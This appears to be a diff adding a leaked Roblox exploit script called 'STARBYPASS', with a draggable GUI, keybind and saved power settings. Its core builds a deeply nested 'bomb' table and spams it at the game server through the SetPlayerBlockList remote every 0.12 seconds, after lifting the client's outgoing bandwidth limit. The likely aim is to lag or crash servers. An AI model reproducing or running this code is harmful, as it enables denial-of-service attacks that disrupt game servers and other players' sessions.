@@ -1,0 +1,812 @@
+-- leaked by https://discord.gg/YJ7Dy4Msg
+
+local VampireBypass = Instance.new("ScreenGui")
+VampireBypass.Name = "VampireBypass"
+VampireBypass.ResetOnSpawn = false
+VampireBypass.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+
+-- Services
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local NetworkClient = game:GetService("NetworkClient")
+
+-- Config System
+local config = {
+    isEnabled = false,
+    isMobileMode = false,
+    keybind = "V",
+    pcPower = 97000,
+    mobilePower = 72000,
+    guiScale = 1.217,
+    guiPosition = UDim2.new(0, 1631, 0, 271)
+}
+
+-- Save/Load Config
+local function saveConfig()
+    if writefile then
+        pcall(function()
+            if not isfolder("VampireBypass") then
+                makefolder("VampireBypass")
+            end
+            writefile("VampireBypass/config.json", HttpService:JSONEncode(config))
+        end)
+    end
+end
+
+local function loadConfig()
+    if isfile and isfile("VampireBypass/config.json") then
+        local success, data = pcall(function()
+            return HttpService:JSONDecode(readfile("VampireBypass/config.json"))
+        end)
+        if success and data then
+            for k, v in pairs(data) do
+                if config[k] ~= nil then
+                    config[k] = v
+                end
+            end
+        end
+    end
+end
+loadConfig()
+
+-- Variables
+local isDragging = false
+local dragStart = nil
+local startPos = nil
+local isResizing = false
+local waitingForKey = false
+local keybindConnection = nil
+
+-- BROSKI SOURCE BOMB FUNCTION (EXACT)
+local DEPTH = 296
+local SPAM_DELAY = 0.12
+
+local function buildBomb(power)
+    local maintable = {}
+    local spammedtable = {}
+    table.insert(spammedtable, {})
+    local z = spammedtable[1]
+    for i = 1, DEPTH do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+    local maxRep = math.floor(power / (DEPTH + 2))
+    for i = 1, maxRep do
+        table.insert(maintable, spammedtable)
+    end
+    return maintable
+end
+
+local running = false
+local bomb = nil
+local spamThread = nil
+
+local function restartSpamLoop()
+    if running then
+        if spamThread then task.cancel(spamThread) end
+        local power = config.isMobileMode and config.mobilePower or config.pcPower
+        bomb = buildBomb(power)
+        spamThread = task.spawn(function()
+            while running do
+                if bomb then
+                    pcall(function()
+                        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
+                    end)
+                end
+                task.wait(SPAM_DELAY)
+            end
+        end)
+    end
+end
+
+local function startBypass()
+    if running then return end
+    running = true
+    NetworkClient:SetOutgoingKBPSLimit(math.huge)
+    restartSpamLoop()
+end
+
+local function stopBypass()
+    running = false
+    if spamThread then task.cancel(spamThread) end
+    bomb = nil
+end
+
+-- Main Frame
+local Frame = Instance.new("Frame")
+Frame.Name = "Frame"
+Frame.ClipsDescendants = true
+Frame.Position = config.guiPosition
+Frame.Size = UDim2.new(0, 238, 0, 224)
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame.Parent = VampireBypass
+
+local UICorner = Instance.new("UICorner")
+UICorner.Name = "UICorner"
+UICorner.CornerRadius = UDim.new(0, 12)
+UICorner.Parent = Frame
+
+local UIStroke = Instance.new("UIStroke")
+UIStroke.Name = "UIStroke"
+UIStroke.Color = Color3.fromRGB(220, 45, 45)
+UIStroke.Thickness = 1.2
+UIStroke.Transparency = 0.3
+UIStroke.Parent = Frame
+
+local UIScale = Instance.new("UIScale")
+UIScale.Name = "UIScale"
+UIScale.Scale = config.guiScale
+UIScale.Parent = Frame
+
+local ImageLabel = Instance.new("ImageLabel")
+ImageLabel.Name = "ImageLabel"
+ImageLabel.Size = UDim2.new(1, 0, 1, 0)
+ImageLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel.BackgroundTransparency = 1
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Image = "rbxassetid://14640607134"
+ImageLabel.ImageColor3 = Color3.fromRGB(170, 170, 170)
+ImageLabel.ImageTransparency = 0.45
+ImageLabel.ScaleType = Enum.ScaleType.Crop
+ImageLabel.Parent = Frame
+
+local Frame2 = Instance.new("Frame")
+Frame2.Name = "Frame"
+Frame2.ZIndex = 3
+Frame2.Size = UDim2.new(1, 0, 1, 0)
+Frame2.BackgroundTransparency = 1
+Frame2.BorderSizePixel = 0
+Frame2.Parent = Frame
+
+-- Title Bar (Draggable)
+local Frame3 = Instance.new("Frame")
+Frame3.Name = "Frame"
+Frame3.ZIndex = 4
+Frame3.Position = UDim2.new(0, 8, 0, 4)
+Frame3.Size = UDim2.new(1, -16, 0, 30)
+Frame3.BackgroundTransparency = 1
+Frame3.Parent = Frame2
+
+local TextLabel = Instance.new("TextLabel")
+TextLabel.Name = "TextLabel"
+TextLabel.ZIndex = 4
+TextLabel.Size = UDim2.new(0.5, 0, 1, 0)
+TextLabel.BackgroundTransparency = 1
+TextLabel.Text = "STARBYPASS"
+TextLabel.TextColor3 = Color3.fromRGB(245, 245, 245)
+TextLabel.TextSize = 12
+TextLabel.Font = Enum.Font.GothamBlack
+TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel.Parent = Frame3
+
+local UIStroke2 = Instance.new("UIStroke")
+UIStroke2.Name = "UIStroke"
+UIStroke2.Thickness = 1.5
+UIStroke2.Transparency = 0.2
+UIStroke2.Parent = TextLabel
+
+-- PC/Mobile Toggle
+local Frame4 = Instance.new("Frame")
+Frame4.Name = "Frame"
+Frame4.ZIndex = 4
+Frame4.AnchorPoint = Vector2.new(1, 0.5)
+Frame4.Position = UDim2.new(1, 0, 0.5, 0)
+Frame4.Size = UDim2.new(0, 108, 0, 24)
+Frame4.BackgroundColor3 = Color3.fromRGB(12, 6, 7)
+Frame4.BackgroundTransparency = 0.05
+Frame4.BorderSizePixel = 0
+Frame4.Parent = Frame3
+
+local UICorner2 = Instance.new("UICorner")
+UICorner2.Name = "UICorner"
+UICorner2.CornerRadius = UDim.new(0, 12)
+UICorner2.Parent = Frame4
+
+local UIStroke3 = Instance.new("UIStroke")
+UIStroke3.Name = "UIStroke"
+UIStroke3.Color = Color3.fromRGB(80, 15, 15)
+UIStroke3.Parent = Frame4
+
+local Frame5 = Instance.new("Frame")
+Frame5.Name = "Frame"
+Frame5.ZIndex = 4
+Frame5.Size = UDim2.new(0.5, -4, 1, -4)
+Frame5.BackgroundColor3 = Color3.fromRGB(220, 45, 45)
+Frame5.BackgroundTransparency = 0.1
+Frame5.BorderSizePixel = 0
+Frame5.Parent = Frame4
+
+local UICorner3 = Instance.new("UICorner")
+UICorner3.Name = "UICorner"
+UICorner3.CornerRadius = UDim.new(0, 10)
+UICorner3.Parent = Frame5
+
+local TextButton = Instance.new("TextButton")
+TextButton.Name = "TextButton"
+TextButton.ZIndex = 5
+TextButton.Size = UDim2.new(0.5, 0, 1, 0)
+TextButton.BackgroundTransparency = 1
+TextButton.Text = "PC"
+TextButton.TextColor3 = Color3.fromRGB(245, 245, 245)
+TextButton.TextSize = 10
+TextButton.Font = Enum.Font.GothamBold
+TextButton.AutoButtonColor = false
+TextButton.Parent = Frame4
+
+local TextButton2 = Instance.new("TextButton")
+TextButton2.Name = "TextButton"
+TextButton2.ZIndex = 5
+TextButton2.Position = UDim2.new(0.5, 0, 0, 0)
+TextButton2.Size = UDim2.new(0.5, 0, 1, 0)
+TextButton2.BackgroundTransparency = 1
+TextButton2.Text = "Mobile"
+TextButton2.TextColor3 = Color3.fromRGB(120, 120, 120)
+TextButton2.TextSize = 10
+TextButton2.Font = Enum.Font.GothamBold
+TextButton2.AutoButtonColor = false
+TextButton2.Parent = Frame4
+
+-- Scrolling Frame
+local ScrollingFrame = Instance.new("ScrollingFrame")
+ScrollingFrame.Name = "ScrollingFrame"
+ScrollingFrame.ZIndex = 4
+ScrollingFrame.Position = UDim2.new(0, 8, 0, 40)
+ScrollingFrame.Size = UDim2.new(1, -16, 1, -84)
+ScrollingFrame.BackgroundTransparency = 1
+ScrollingFrame.ScrollBarThickness = 2
+ScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(220, 45, 45)
+ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 5)
+ScrollingFrame.Parent = Frame2
+
+local Frame6 = Instance.new("Frame")
+Frame6.Name = "Frame"
+Frame6.Size = UDim2.new(1, 0, 0, 0)
+Frame6.BackgroundTransparency = 1
+Frame6.Parent = ScrollingFrame
+
+local UIListLayout = Instance.new("UIListLayout")
+UIListLayout.Name = "UIListLayout"
+UIListLayout.Padding = UDim.new(0, 6)
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout.Parent = Frame6
+
+-- PC Section
+local Frame7 = Instance.new("Frame")
+Frame7.Name = "Frame"
+Frame7.Size = UDim2.new(1, 0, 0, 0)
+Frame7.BackgroundTransparency = 1
+Frame7.Parent = Frame6
+
+local UIListLayout2 = Instance.new("UIListLayout")
+UIListLayout2.Name = "UIListLayout"
+UIListLayout2.Padding = UDim.new(0, 6)
+UIListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout2.Parent = Frame7
+
+-- Enable/Disable Button
+local Frame8 = Instance.new("Frame")
+Frame8.Name = "Frame"
+Frame8.ZIndex = 4
+Frame8.Size = UDim2.new(1, 0, 0, 50)
+Frame8.BackgroundColor3 = Color3.fromRGB(14, 7, 8)
+Frame8.BackgroundTransparency = 0.15
+Frame8.BorderSizePixel = 0
+Frame8.Parent = Frame7
+
+local UICorner4 = Instance.new("UICorner")
+UICorner4.Name = "UICorner"
+UICorner4.Parent = Frame8
+
+local UIStroke4 = Instance.new("UIStroke")
+UIStroke4.Name = "UIStroke"
+UIStroke4.Color = Color3.fromRGB(80, 15, 15)
+UIStroke4.Thickness = 0.7
+UIStroke4.Parent = Frame8
+
+local TextButton3 = Instance.new("TextButton")
+TextButton3.Name = "TextButton"
+TextButton3.ZIndex = 5
+TextButton3.Position = UDim2.new(0, 6, 0, 4)
+TextButton3.Size = UDim2.new(1, -12, 1, -8)
+TextButton3.BackgroundColor3 = Color3.fromRGB(22, 9, 11)
+TextButton3.Text = "DISABLED"
+TextButton3.TextColor3 = Color3.fromRGB(150, 150, 180)
+TextButton3.TextSize = 14
+TextButton3.Font = Enum.Font.GothamBlack
+TextButton3.AutoButtonColor = false
+TextButton3.Parent = Frame8
+
+local UICorner5 = Instance.new("UICorner")
+UICorner5.Name = "UICorner"
+UICorner5.CornerRadius = UDim.new(0, 7)
+UICorner5.Parent = TextButton3
+
+-- Key Bind
+local Frame9 = Instance.new("Frame")
+Frame9.Name = "Frame"
+Frame9.ZIndex = 4
+Frame9.Size = UDim2.new(1, 0, 0, 30)
+Frame9.BackgroundColor3 = Color3.fromRGB(14, 7, 8)
+Frame9.BackgroundTransparency = 0.15
+Frame9.BorderSizePixel = 0
+Frame9.Parent = Frame7
+
+local UICorner6 = Instance.new("UICorner")
+UICorner6.Name = "UICorner"
+UICorner6.Parent = Frame9
+
+local UIStroke5 = Instance.new("UIStroke")
+UIStroke5.Name = "UIStroke"
+UIStroke5.Color = Color3.fromRGB(80, 15, 15)
+UIStroke5.Thickness = 0.7
+UIStroke5.Parent = Frame9
+
+local TextLabel2 = Instance.new("TextLabel")
+TextLabel2.Name = "TextLabel"
+TextLabel2.ZIndex = 5
+TextLabel2.Position = UDim2.new(0, 8, 0, 0)
+TextLabel2.Size = UDim2.new(0.5, -8, 1, 0)
+TextLabel2.BackgroundTransparency = 1
+TextLabel2.Text = "Key"
+TextLabel2.TextColor3 = Color3.fromRGB(245, 245, 245)
+TextLabel2.TextSize = 9
+TextLabel2.Font = Enum.Font.Gotham
+TextLabel2.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel2.Parent = Frame9
+
+local TextButton4 = Instance.new("TextButton")
+TextButton4.Name = "TextButton"
+TextButton4.ZIndex = 5
+TextButton4.Position = UDim2.new(1, -54, 0.5, -9)
+TextButton4.Size = UDim2.new(0, 48, 0, 18)
+TextButton4.BackgroundColor3 = Color3.fromRGB(28, 9, 11)
+TextButton4.Text = config.keybind
+TextButton4.TextColor3 = Color3.fromRGB(220, 45, 45)
+TextButton4.TextSize = 9
+TextButton4.Font = Enum.Font.GothamBold
+TextButton4.Parent = Frame9
+
+local UICorner7 = Instance.new("UICorner")
+UICorner7.Name = "UICorner"
+UICorner7.CornerRadius = UDim.new(0, 5)
+UICorner7.Parent = TextButton4
+
+-- Power Input (PC)
+local Frame10 = Instance.new("Frame")
+Frame10.Name = "Frame"
+Frame10.ZIndex = 4
+Frame10.Size = UDim2.new(1, 0, 0, 30)
+Frame10.BackgroundColor3 = Color3.fromRGB(14, 7, 8)
+Frame10.BackgroundTransparency = 0.15
+Frame10.BorderSizePixel = 0
+Frame10.Parent = Frame7
+
+local UICorner8 = Instance.new("UICorner")
+UICorner8.Name = "UICorner"
+UICorner8.Parent = Frame10
+
+local UIStroke6 = Instance.new("UIStroke")
+UIStroke6.Name = "UIStroke"
+UIStroke6.Color = Color3.fromRGB(80, 15, 15)
+UIStroke6.Thickness = 0.7
+UIStroke6.Parent = Frame10
+
+local TextLabel3 = Instance.new("TextLabel")
+TextLabel3.Name = "TextLabel"
+TextLabel3.ZIndex = 5
+TextLabel3.Position = UDim2.new(0, 8, 0, 0)
+TextLabel3.Size = UDim2.new(0.5, -8, 1, 0)
+TextLabel3.BackgroundTransparency = 1
+TextLabel3.Text = "Power"
+TextLabel3.TextColor3 = Color3.fromRGB(245, 245, 245)
+TextLabel3.TextSize = 9
+TextLabel3.Font = Enum.Font.Gotham
+TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel3.Parent = Frame10
+
+local TextBox = Instance.new("TextBox")
+TextBox.Name = "TextBox"
+TextBox.ZIndex = 5
+TextBox.Position = UDim2.new(1, -61, 0.5, -9)
+TextBox.Size = UDim2.new(0, 55, 0, 18)
+TextBox.BackgroundColor3 = Color3.fromRGB(28, 9, 11)
+TextBox.Text = tostring(config.pcPower)
+TextBox.TextColor3 = Color3.fromRGB(220, 45, 45)
+TextBox.Font = Enum.Font.GothamBold
+TextBox.ClearTextOnFocus = false
+TextBox.Parent = Frame10
+
+local UICorner9 = Instance.new("UICorner")
+UICorner9.Name = "UICorner"
+UICorner9.CornerRadius = UDim.new(0, 5)
+UICorner9.Parent = TextBox
+
+-- Mobile Section
+local Frame11 = Instance.new("Frame")
+Frame11.Name = "Frame"
+Frame11.Visible = config.isMobileMode
+Frame11.Size = UDim2.new(1, 0, 0, 0)
+Frame11.BackgroundTransparency = 1
+Frame11.Parent = Frame6
+
+local UIListLayout3 = Instance.new("UIListLayout")
+UIListLayout3.Name = "UIListLayout"
+UIListLayout3.Padding = UDim.new(0, 6)
+UIListLayout3.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout3.Parent = Frame11
+
+-- Mobile Enable/Disable Button
+local Frame12 = Instance.new("Frame")
+Frame12.Name = "Frame"
+Frame12.ZIndex = 4
+Frame12.Size = UDim2.new(1, 0, 0, 80)
+Frame12.BackgroundColor3 = Color3.fromRGB(14, 7, 8)
+Frame12.BackgroundTransparency = 0.15
+Frame12.BorderSizePixel = 0
+Frame12.Parent = Frame11
+
+local UICorner10 = Instance.new("UICorner")
+UICorner10.Name = "UICorner"
+UICorner10.Parent = Frame12
+
+local UIStroke7 = Instance.new("UIStroke")
+UIStroke7.Name = "UIStroke"
+UIStroke7.Color = Color3.fromRGB(80, 15, 15)
+UIStroke7.Thickness = 0.7
+UIStroke7.Parent = Frame12
+
+local TextButton5 = Instance.new("TextButton")
+TextButton5.Name = "TextButton"
+TextButton5.ZIndex = 5
+TextButton5.Position = UDim2.new(0, 6, 0, 4)
+TextButton5.Size = UDim2.new(1, -12, 1, -8)
+TextButton5.BackgroundColor3 = Color3.fromRGB(22, 9, 11)
+TextButton5.Text = "OFF"
+TextButton5.TextColor3 = Color3.fromRGB(150, 150, 180)
+TextButton5.TextSize = 18
+TextButton5.Font = Enum.Font.GothamBlack
+TextButton5.AutoButtonColor = false
+TextButton5.Parent = Frame12
+
+local UICorner11 = Instance.new("UICorner")
+UICorner11.Name = "UICorner"
+UICorner11.CornerRadius = UDim.new(0, 7)
+UICorner11.Parent = TextButton5
+
+-- Power Input (Mobile)
+local Frame13 = Instance.new("Frame")
+Frame13.Name = "Frame"
+Frame13.ZIndex = 4
+Frame13.Size = UDim2.new(1, 0, 0, 30)
+Frame13.BackgroundColor3 = Color3.fromRGB(14, 7, 8)
+Frame13.BackgroundTransparency = 0.15
+Frame13.BorderSizePixel = 0
+Frame13.Parent = Frame11
+
+local UICorner12 = Instance.new("UICorner")
+UICorner12.Name = "UICorner"
+UICorner12.Parent = Frame13
+
+local UIStroke8 = Instance.new("UIStroke")
+UIStroke8.Name = "UIStroke"
+UIStroke8.Color = Color3.fromRGB(80, 15, 15)
+UIStroke8.Thickness = 0.7
+UIStroke8.Parent = Frame13
+
+local TextLabel4 = Instance.new("TextLabel")
+TextLabel4.Name = "TextLabel"
+TextLabel4.ZIndex = 5
+TextLabel4.Position = UDim2.new(0, 8, 0, 0)
+TextLabel4.Size = UDim2.new(0.5, -8, 1, 0)
+TextLabel4.BackgroundTransparency = 1
+TextLabel4.Text = "Power"
+TextLabel4.TextColor3 = Color3.fromRGB(245, 245, 245)
+TextLabel4.TextSize = 9
+TextLabel4.Font = Enum.Font.Gotham
+TextLabel4.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel4.Parent = Frame13
+
+local TextBox2 = Instance.new("TextBox")
+TextBox2.Name = "TextBox"
+TextBox2.ZIndex = 5
+TextBox2.Position = UDim2.new(1, -61, 0.5, -9)
+TextBox2.Size = UDim2.new(0, 55, 0, 18)
+TextBox2.BackgroundColor3 = Color3.fromRGB(28, 9, 11)
+TextBox2.Text = tostring(config.mobilePower)
+TextBox2.TextColor3 = Color3.fromRGB(220, 45, 45)
+TextBox2.Font = Enum.Font.GothamBold
+TextBox2.ClearTextOnFocus = false
+TextBox2.Parent = Frame13
+
+local UICorner13 = Instance.new("UICorner")
+UICorner13.Name = "UICorner"
+UICorner13.CornerRadius = UDim.new(0, 5)
+UICorner13.Parent = TextBox2
+
+-- Size Slider
+local Frame14 = Instance.new("Frame")
+Frame14.Name = "Frame"
+Frame14.ZIndex = 4
+Frame14.Position = UDim2.new(0, 8, 1, -40)
+Frame14.Size = UDim2.new(1, -16, 0, 34)
+Frame14.BackgroundColor3 = Color3.fromRGB(12, 6, 7)
+Frame14.BackgroundTransparency = 0.1
+Frame14.BorderSizePixel = 0
+Frame14.Parent = Frame2
+
+local UICorner14 = Instance.new("UICorner")
+UICorner14.Name = "UICorner"
+UICorner14.Parent = Frame14
+
+local UIStroke9 = Instance.new("UIStroke")
+UIStroke9.Name = "UIStroke"
+UIStroke9.Color = Color3.fromRGB(80, 15, 15)
+UIStroke9.Thickness = 0.7
+UIStroke9.Parent = Frame14
+
+local TextLabel5 = Instance.new("TextLabel")
+TextLabel5.Name = "TextLabel"
+TextLabel5.ZIndex = 5
+TextLabel5.Position = UDim2.new(0, 8, 0, 0)
+TextLabel5.Size = UDim2.new(0, 34, 1, 0)
+TextLabel5.BackgroundTransparency = 1
+TextLabel5.Text = "SIZE"
+TextLabel5.TextColor3 = Color3.fromRGB(245, 245, 245)
+TextLabel5.TextSize = 9
+TextLabel5.Font = Enum.Font.GothamBold
+TextLabel5.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel5.Parent = Frame14
+
+local Frame15 = Instance.new("Frame")
+Frame15.Name = "Frame"
+Frame15.ZIndex = 5
+Frame15.AnchorPoint = Vector2.new(0, 0.5)
+Frame15.Position = UDim2.new(0, 48, 0.5, 0)
+Frame15.Size = UDim2.new(1, -96, 0, 5)
+Frame15.BackgroundColor3 = Color3.fromRGB(40, 14, 14)
+Frame15.BorderSizePixel = 0
+Frame15.Parent = Frame14
+
+local UICorner15 = Instance.new("UICorner")
+UICorner15.Name = "UICorner"
+UICorner15.CornerRadius = UDim.new(1, 0)
+UICorner15.Parent = Frame15
+
+local Frame16 = Instance.new("Frame")
+Frame16.Name = "Frame"
+Frame16.ZIndex = 6
+Frame16.Size = UDim2.new(0, 0, 1, 0)
+Frame16.BackgroundColor3 = Color3.fromRGB(220, 45, 45)
+Frame16.BorderSizePixel = 0
+Frame16.Parent = Frame15
+
+local UICorner16 = Instance.new("UICorner")
+UICorner16.Name = "UICorner"
+UICorner16.CornerRadius = UDim.new(1, 0)
+UICorner16.Parent = Frame16
+
+local Frame17 = Instance.new("Frame")
+Frame17.Name = "Frame"
+Frame17.ZIndex = 7
+Frame17.AnchorPoint = Vector2.new(0.5, 0.5)
+Frame17.Position = UDim2.new(0, 0, 0.5, 0)
+Frame17.Size = UDim2.new(0, 14, 0, 14)
+Frame17.BackgroundColor3 = Color3.fromRGB(255, 90, 90)
+Frame17.BorderSizePixel = 0
+Frame17.Parent = Frame15
+
+local UICorner17 = Instance.new("UICorner")
+UICorner17.Name = "UICorner"
+UICorner17.CornerRadius = UDim.new(1, 0)
+UICorner17.Parent = Frame17
+
+local UIStroke10 = Instance.new("UIStroke")
+UIStroke10.Name = "UIStroke"
+UIStroke10.Transparency = 0.4
+UIStroke10.Parent = Frame17
+
+local TextLabel6 = Instance.new("TextLabel")
+TextLabel6.Name = "TextLabel"
+TextLabel6.ZIndex = 5
+TextLabel6.AnchorPoint = Vector2.new(1, 0.5)
+TextLabel6.Position = UDim2.new(1, -8, 0.5, 0)
+TextLabel6.Size = UDim2.new(0, 40, 1, 0)
+TextLabel6.BackgroundTransparency = 1
+TextLabel6.Text = "122%"
+TextLabel6.TextColor3 = Color3.fromRGB(220, 45, 45)
+TextLabel6.TextSize = 9
+TextLabel6.Font = Enum.Font.GothamBold
+TextLabel6.TextXAlignment = Enum.TextXAlignment.Right
+TextLabel6.Parent = Frame14
+
+local TextButton6 = Instance.new("TextButton")
+TextButton6.Name = "TextButton"
+TextButton6.ZIndex = 8
+TextButton6.AnchorPoint = Vector2.new(0, 0.5)
+TextButton6.Position = UDim2.new(0, 44, 0.5, 0)
+TextButton6.Size = UDim2.new(1, -88, 0, 26)
+TextButton6.BackgroundTransparency = 1
+TextButton6.Text = ""
+TextButton6.AutoButtonColor = false
+TextButton6.Parent = Frame14
+
+-- Update UI
+local function updateUI()
+    if config.isEnabled then
+        TextButton3.Text = "ENABLED"
+        TextButton3.TextColor3 = Color3.fromRGB(220, 45, 45)
+        TextButton3.BackgroundColor3 = Color3.fromRGB(30, 10, 12)
+        TextButton5.Text = "ON"
+        TextButton5.TextColor3 = Color3.fromRGB(220, 45, 45)
+        TextButton5.BackgroundColor3 = Color3.fromRGB(30, 10, 12)
+    else
+        TextButton3.Text = "DISABLED"
+        TextButton3.TextColor3 = Color3.fromRGB(150, 150, 180)
+        TextButton3.BackgroundColor3 = Color3.fromRGB(22, 9, 11)
+        TextButton5.Text = "OFF"
+        TextButton5.TextColor3 = Color3.fromRGB(150, 150, 180)
+        TextButton5.BackgroundColor3 = Color3.fromRGB(22, 9, 11)
+    end
+    
+    if config.isMobileMode then
+        Frame5.Position = UDim2.new(0.5, 2, 0, 2)
+        TextButton2.TextColor3 = Color3.fromRGB(245, 245, 245)
+        TextButton.TextColor3 = Color3.fromRGB(120, 120, 120)
+        Frame11.Visible = true
+        Frame7.Visible = false
+    else
+        Frame5.Position = UDim2.new(0, 2, 0, 2)
+        TextButton.TextColor3 = Color3.fromRGB(245, 245, 245)
+        TextButton2.TextColor3 = Color3.fromRGB(120, 120, 120)
+        Frame11.Visible = false
+        Frame7.Visible = true
+    end
+    
+    TextButton4.Text = config.keybind
+    TextBox.Text = tostring(config.pcPower)
+    TextBox2.Text = tostring(config.mobilePower)
+    
+    UIScale.Scale = config.guiScale
+    local relativeX = (config.guiScale - 0.5) / 2
+    Frame16.Size = UDim2.new(relativeX, 0, 1, 0)
+    Frame17.Position = UDim2.new(relativeX, 0, 0.5, 0)
+    TextLabel6.Text = math.floor(config.guiScale * 100) .. "%"
+end
+
+-- Toggle
+local function toggleEnabled()
+    config.isEnabled = not config.isEnabled
+    updateUI()
+    saveConfig()
+    if config.isEnabled then
+        startBypass()
+    else
+        stopBypass()
+    end
+end
+
+-- Keybind handler
+local function setupKeybind()
+    if keybindConnection then keybindConnection:Disconnect() end
+    keybindConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        if gameProcessed then return end
+        if not waitingForKey and input.UserInputType == Enum.UserInputType.Keyboard then
+            if input.KeyCode.Name == config.keybind then
+                toggleEnabled()
+            end
+        end
+    end)
+end
+setupKeybind()
+
+-- PC/Mobile Toggle
+TextButton.MouseButton1Click:Connect(function()
+    config.isMobileMode = false
+    updateUI()
+    saveConfig()
+end)
+TextButton2.MouseButton1Click:Connect(function()
+    config.isMobileMode = true
+    updateUI()
+    saveConfig()
+end)
+
+-- Enable/Disable
+TextButton3.MouseButton1Click:Connect(function() toggleEnabled() end)
+TextButton5.MouseButton1Click:Connect(function() toggleEnabled() end)
+
+-- Key Bind
+TextButton4.MouseButton1Click:Connect(function()
+    waitingForKey = true
+    TextButton4.Text = "..."
+    local connection
+    connection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        if gameProcessed then return end
+        if input.UserInputType == Enum.UserInputType.Keyboard then
+            config.keybind = input.KeyCode.Name
+            waitingForKey = false
+            updateUI()
+            saveConfig()
+            setupKeybind()
+            connection:Disconnect()
+        end
+    end)
+end)
+
+-- Number validation
+local function validateNumber(textbox, isPC)
+    local num = tonumber(textbox.Text)
+    if not num or num < 10000 then num = isPC and 97000 or 72000 end
+    if num > 150000 then num = 150000 end
+    num = math.floor(num)
+    textbox.Text = tostring(num)
+    if isPC then config.pcPower = num else config.mobilePower = num end
+    saveConfig()
+    if running then restartSpamLoop() end
+end
+
+TextBox.FocusLost:Connect(function() validateNumber(TextBox, true) end)
+TextBox2.FocusLost:Connect(function() validateNumber(TextBox2, false) end)
+
+-- Dragging
+Frame3.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        isDragging = true
+        dragStart = input.Position
+        startPos = Frame.Position
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if isDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+    if isResizing and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local relativeX = (input.Position.X - Frame15.AbsolutePosition.X) / Frame15.AbsoluteSize.X
+        relativeX = math.clamp(relativeX, 0, 1)
+        config.guiScale = 0.5 + (relativeX * 2)
+        updateUI()
+        saveConfig()
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        if isDragging then config.guiPosition = Frame.Position; saveConfig() end
+        isDragging = false
+        isResizing = false
+    end
+end)
+
+-- Size slider
+TextButton6.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        isResizing = true
+        local relativeX = (input.Position.X - Frame15.AbsolutePosition.X) / Frame15.AbsoluteSize.X
+        relativeX = math.clamp(relativeX, 0, 1)
+        config.guiScale = 0.5 + (relativeX * 2)
+        updateUI()
+        saveConfig()
+    end
+end)
+
+-- Canvas auto-size
+UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 10)
+end)
+UIListLayout2:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 10)
+end)
+UIListLayout3:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+    ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 10)
+end)
+
+-- Load state
+if config.isEnabled then startBypass() end
+updateUI()
+
+print("leaked by https://discord.gg/YJ7Dy4Msg - STAR Bypass Loaded!")
